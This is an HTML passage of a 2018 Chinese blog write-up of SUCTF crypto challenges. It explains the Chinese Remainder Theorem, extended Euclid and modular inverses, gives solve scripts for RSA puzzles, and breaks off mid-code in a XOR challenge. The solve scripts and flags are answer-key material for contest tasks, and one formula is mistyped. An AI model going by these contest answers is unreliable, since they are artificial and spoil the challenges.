<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Another independent blog written by a CTFer."><title>SUCTF 2018 Write-up | ultranal blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create','UA-42440632-2','auto');ga('send','pageview');
</script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">SUCTF 2018 Write-up</h1><a id="logo" href="/.">ultranal blog</a><p class="description">Memories &amp; Technologies</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">SUCTF 2018 Write-up</h1><div class="post-meta">May 27, 2018<span> | </span><span class="category"><a href="/categories/writeup/">writeup</a></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 4k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 19</span><span class="post-meta-item-text"> 分钟</span></span></span></div><a class="disqus-comment-count" data-disqus-identifier="2018/05/27/suctf-writeup/" href="/2018/05/27/suctf-writeup/#disqus_thread"></a><div class="post-content"><ol>
<li>还是先写最近的……否则真的容易忘</li>
<li>想交个wp从来都没资格</li>
</ol>
<p>另外感谢SU大佬们提供了这么好的题目。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>这次SUCTF算是好好的复习了一下数论（明明本来就很简单）。<br>然而为什么这么多数学公式……排个版真难</p>
<h3 id="SandGame"><a href="#SandGame" class="headerlink" title="SandGame"></a>SandGame</h3><p>这是一道Misc题，但由于涉及了数论知识，故写在Crypto里。</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>game.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = int(flag[<span class="number">5</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"sand.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(str(sand)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
<p>sand.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">222</span><br><span class="line">203</span><br><span class="line">33</span><br><span class="line">135</span><br><span class="line">203</span><br><span class="line">62</span><br><span class="line">227</span><br><span class="line">82</span><br><span class="line">239</span><br><span class="line">82</span><br><span class="line">11</span><br><span class="line">220</span><br><span class="line">74</span><br><span class="line">92</span><br><span class="line">8</span><br><span class="line">308</span><br><span class="line">195</span><br><span class="line">165</span><br><span class="line">87</span><br><span class="line">4</span><br></pre></td></tr></table></figure></p>
<h4 id="同余方程组"><a href="#同余方程组" class="headerlink" title="同余方程组"></a>同余方程组</h4><p>这段代码加上sand.txt给出来的解，实际上构成了下面的同余方程组：</p>
<p>\[<br>\begin{aligned}<br>    n \equiv 222 \pmod{257}\<br>    n \equiv 203 \pmod{263}\<br>    n \equiv 33 \pmod{269}\<br>    n \equiv 135 \pmod{271}\<br>    n \equiv 203 \pmod{277}\<br>    n \equiv 62 \pmod{281}\<br>    n \equiv 227 \pmod{283}\<br>    n \equiv 82 \pmod{293}\<br>    n \equiv 239 \pmod{307}\<br>    n \equiv 82 \pmod{311}\<br>    n \equiv 11 \pmod{313}\<br>    n \equiv 220 \pmod{317}\<br>    n \equiv 74 \pmod{331}\<br>    n \equiv 92 \pmod{337}\<br>    n \equiv 8 \pmod{347}\<br>    n \equiv 308 \pmod{349}\<br>    n \equiv 195 \pmod{353}\<br>    n \equiv 165 \pmod{359}\<br>    n \equiv 87 \pmod{367}\<br>    n \equiv 4 \pmod{373}<br>\end{aligned}<br>\]</p>
<p>类似这样的方程组，在数论中称作一元线性<strong>同余方程组</strong>。</p>
<h4 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h4><p>著名的<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener"><strong>中国剩余定理</strong></a>描述了一元线性同余方程组有解的判定条件及其解法：</p>
<ul>
<li>一元线性同余方程组</li>
</ul>
<p>\[<br>\begin{aligned}<br>(\mathbf{S}) : \quad \left{ \begin{matrix} x \equiv a_1 \pmod {m_1} \ x \equiv a_2 \pmod {m_2} \ \vdots \qquad\qquad\qquad \ x \equiv a_n \pmod {m_n} \end{matrix} \right.<br>\end{aligned}<br>\]</p>
<p>有解，当且仅当其所有模数\(m_1, m_2, \ldots, m_n\)互质（这里的S式符合这个条件）；</p>
<ul>
<li>记\(M=\prod_{i=1}^{n} m_i\)，\(M_i = M / m_i\)，\(t_i\)为\(M_i\)的模逆元，则S的解符合以下公式：</li>
</ul>
<p>$$<br>\begin{aligned}<br>x \equiv \sum_{i_1}^{n} a_it_iM_i \pmod{M}<br>\end{aligned}<br>$$</p>
<h4 id="模逆元和扩展欧几里得算法"><a href="#模逆元和扩展欧几里得算法" class="headerlink" title="模逆元和扩展欧几里得算法"></a>模逆元和扩展欧几里得算法</h4><p>讲到这里，就不得不提一下<a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">模逆元</a>的概念：整数a在模N意义下的模逆元是指满足以下公式的整数b：</p>
<p>$$<br>\begin{aligned}<br>a^{-1} \equiv b \pmod{N}<br>\end{aligned}<br>$$</p>
<p>模逆元仅在a和N互质的情况下存在。换言之，在模N的意义下，<strong>对a的除法可以通过和a的模逆元b的乘法来达成</strong>（RSA一题的主要原理）。</p>
<p>求模逆元使用<a href="https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">扩展欧几里得算法</a>（欧几里得算法就是辗转相除法）来实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_eucild</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    d, x, y = extended_eucild(b, a % b)</span><br><span class="line">    x, y = y, x - a / b * y</span><br><span class="line">    <span class="keyword">return</span> d, x, y</span><br></pre></td></tr></table></figure>
<h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>说了这么多，本题的解法就是通过扩展欧几里得算法求解上文给定的一元线性同余方程组S：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">222</span>, <span class="number">203</span>, <span class="number">33</span>, <span class="number">135</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">227</span>, <span class="number">82</span>, <span class="number">239</span>, <span class="number">82</span>, <span class="number">11</span>, <span class="number">220</span>, <span class="number">74</span>, <span class="number">92</span>, <span class="number">8</span>, <span class="number">308</span>, <span class="number">195</span>, <span class="number">165</span>, <span class="number">87</span>, <span class="number">4</span>]</span><br><span class="line">w = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_eucild</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    d, x, y = extended_eucild(b, a % b)</span><br><span class="line">    x, y = y, x - a / b * y</span><br><span class="line">    <span class="keyword">return</span> d, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crt</span><span class="params">(a, w)</span>:</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> w:</span><br><span class="line">        n *= i</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(w)):</span><br><span class="line">        m = n / w[i]</span><br><span class="line">        d, x, y = extended_eucild(w[i], m)</span><br><span class="line">        ret = (ret + y * m * a[i] % n) % n</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(crt(a, w))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>当然你也可以用 GNU MP 库来实现。</p>
<blockquote>
<p>flag{This_is_the_CRT_xwg)}</p>
</blockquote>
<h3 id="RSA-good"><a href="#RSA-good" class="headerlink" title="RSA good"></a>RSA good</h3><p>题目给定了N和e</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">342455709448748144126356744976385170973517744602059517490422045682543287960167955127769980654250125331171261846920903825693509591867402054748269545989173880386620770767057995165518626234085821335790902075953939551116777613078301529741199260825495593643848062203477826484698214686522001924292713782595019038086926834360866522789951283935502968545347160597915951673480253253216027297476774028106074570088497425654525031294571609018030761716007610673627163536370205798268831577480146622906265953470659107801115278898533958878045433701201601516984582294147038705649395688342773971893457527598221773710752744142729023770679</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure>
<p>注意到，给定的N具有<a href="http://factordb.com/index.php?query=342455709448748144126356744976385170973517744602059517490422045682543287960167955127769980654250125331171261846920903825693509591867402054748269545989173880386620770767057995165518626234085821335790902075953939551116777613078301529741199260825495593643848062203477826484698214686522001924292713782595019038086926834360866522789951283935502968545347160597915951673480253253216027297476774028106074570088497425654525031294571609018030761716007610673627163536370205798268831577480146622906265953470659107801115278898533958878045433701201601516984582294147038705649395688342773971893457527598221773710752744142729023770679" target="_blank" rel="noopener">已知的质因数分解</a>：</p>
<blockquote>
<p>  3424557094…79<618> = 7 · 4892224420…97<617></617></618></p>
</blockquote>
<p>则p = 7, q = 4892224420…97。计算可得r, d = 1170425334…09。</p>
<p>利用<a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">rsatool</a>创建PEM格式的私钥，通过openssl rsautil 解密给定密文：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python rsatool.py -f PEM -o key.pem -n 3424557094...79 -d 1170425334...09</span><br><span class="line">$ openssl rsautl -decrypt -<span class="keyword">in</span> pp.txt -inkey key.pem -out ppp.dec -raw</span><br></pre></td></tr></table></figure>
<p>得到flag:</p>
<blockquote>
<p>SUCTF{Ju5t_hav3_fun_1n_R34_4Ga1N!}</p>
</blockquote>
<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invmod</span><span class="params">(a, n)</span>:</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    new_t = <span class="number">1</span></span><br><span class="line">    r = n</span><br><span class="line">    new_r = a</span><br><span class="line">    <span class="keyword">while</span> new_r != <span class="number">0</span>:</span><br><span class="line">        q = r // new_r</span><br><span class="line">        (t, new_t) = (new_t, t - q * new_t)</span><br><span class="line">        (r, new_r) = (new_r, r - q * new_r)</span><br><span class="line">    <span class="keyword">if</span> r &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'unexpected'</span>)</span><br><span class="line">    <span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">        t += n</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">smallPrimes = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primefactor</span><span class="params">(p)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> smallPrimes:</span><br><span class="line">        <span class="keyword">if</span> p % x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isprime</span><span class="params">(p, n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        a = random.randint(<span class="number">1</span>, p)</span><br><span class="line">        <span class="keyword">if</span> pow(a, p - <span class="number">1</span>, p) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span><span class="params">(bit)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        p = random.randint(<span class="number">2</span>**(bit - <span class="number">1</span>), <span class="number">2</span>**bit - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> primefactor(p) <span class="keyword">and</span> isprime(p, <span class="number">5</span>):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKey</span><span class="params">(keybits)</span>:</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    bit = (keybits + <span class="number">1</span>) // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    p = <span class="number">7</span></span><br><span class="line">    <span class="keyword">while</span> (p - <span class="number">1</span>) % e == <span class="number">0</span>:</span><br><span class="line">        p = getprime(bit)</span><br><span class="line"></span><br><span class="line">    q = p</span><br><span class="line">    <span class="keyword">while</span> q == p <span class="keyword">or</span> (q - <span class="number">1</span>) % e == <span class="number">0</span>:</span><br><span class="line">        q = getprime(bit)</span><br><span class="line"></span><br><span class="line">    n = p * q</span><br><span class="line">    et = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = invmod(e, et)</span><br><span class="line">    pub = (e, n)</span><br><span class="line">    priv = (d, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (pub, priv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pub, priv = genKey(<span class="number">2048</span>)</span><br><span class="line">(e,n) = pub</span><br><span class="line">(d,n) = priv</span><br><span class="line">de_hash = set()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2n</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int.from_bytes(s, byteorder=<span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2b</span><span class="params">(k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> k.to_bytes((k.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">'big'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(cipher)</span><br><span class="line">    digest = md5.digest()</span><br><span class="line">    <span class="keyword">if</span> digest <span class="keyword">in</span> de_hash:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'Already decrypted'</span>)</span><br><span class="line">    de_hash.add(digest)</span><br><span class="line">    <span class="keyword">return</span> n2b(pow(b2n(cipher), d, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    plain = </span><br><span class="line">    cipher = n2b(pow(b2n(plain), e, n))</span><br><span class="line">    r = random.randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">    c = b2n(cipher)</span><br><span class="line">    c2 = (pow(r, e, n) * c) % n</span><br><span class="line">    <span class="keyword">print</span> (e)</span><br><span class="line">    <span class="keyword">print</span> (d)</span><br><span class="line">    <span class="keyword">print</span> (c2,r,n)</span><br></pre></td></tr></table></figure>
<p>解读代码，可以看见生成了随机值r,将r和flag分别加密后密文值相乘为c2。给定d, e, c2, r, N，求解flag。</p>
<p>换言之：</p>
<p>$$<br>\begin{aligned}<br>    flag^e \cdot r^e \equiv c_2 \pmod{N}<br>\end{aligned}<br>$$</p>
<p>考虑到上文<a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">模逆元</a>的定义：</p>
<p>$$<br>\begin{aligned}<br>    c_2^d \equiv flag \cdot r \pmod{N} \<br>    flag \equiv r^-1 \pmod{N}<br>\end{aligned}<br>$$</p>
<p>flag*r的值可以通过openssl rsautil解密获得。</p>
<p>问题即转化为求r对N的模逆元。注意，由于N, r较大，这里的扩展欧几里得算法需要用递推实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">rmuln = <span class="number">59115915707374791858043439923167683347161887030487325917423499796492203695323206558401630102578799900218436597230954437778111746830394958514693795703668608134688484361451977542361964879441862660907225537016230464396774501614633550453344389997701652088926779491939154277967969883770814387902879875613743223229395914926347385430187855896072954220734275197088587384423545384415702580062626846187660369433673963925368283292589562338733264483707085154679553150155966218540039768554264425242930122630759578034001784040206494331067331934081888223924875304452399021658433028042708859136403044098846651745078168587090692758339</span></span><br><span class="line">N = <span class="number">114074818133739504250047209185005541235104076834407454843024262517200619155182936436785962918603977053600646077595890908700137268868699889055060972806312126948522642693058329618120858621695314653366215387973749480530773400994063166095532724955861880985112526415669572580061355860224679573858183474455325088556643994673345465994162610420723170253345262031304174343327749668957998269532265104735742501097132399909676529715137398930849255495327761212026819673358330120772259339210848101393790624794141497382162858696771273350710124735773784422786465775396114824753700050260926501450377050949467981761553058188615697572753</span></span><br><span class="line">r = <span class="number">52590127432976083491238732503614965276544329818688634632767137973918045578992812985289716736906703169505549436697176020030544816837575642406120330044094101926756390272838108002439881182112360442668104629856258556842855755302886464339208354825118921549697616322247157559049488040135615532105368336491021854265473475528069047122826089655385379767218204046669380406790462989897640184187821995434927599001724468830237117370372883192568919508659630357441363324857869183828526986625221594440014568348246392587406204121296464310150086319496345975298783813760793880968818397424849582987543667279959113716063661758542453795636</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_eucild</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        p.append((a, b))</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    x, y = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> len(p) &gt; <span class="number">0</span>:</span><br><span class="line">        a, b = p.pop()      </span><br><span class="line">        x, y = y, x - a / b * y</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:    </span><br><span class="line">    x, y = extended_eucild(r, N)        </span><br><span class="line">    t = (x * rmuln) % N</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"%x"</span> % t).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>SUCTF{Ju5t_hav3_fun_emmm}</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cycle"><a href="#Cycle" class="headerlink" title="Cycle"></a>Cycle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        cipher += chr(ord(key[i % len(key)]) ^ 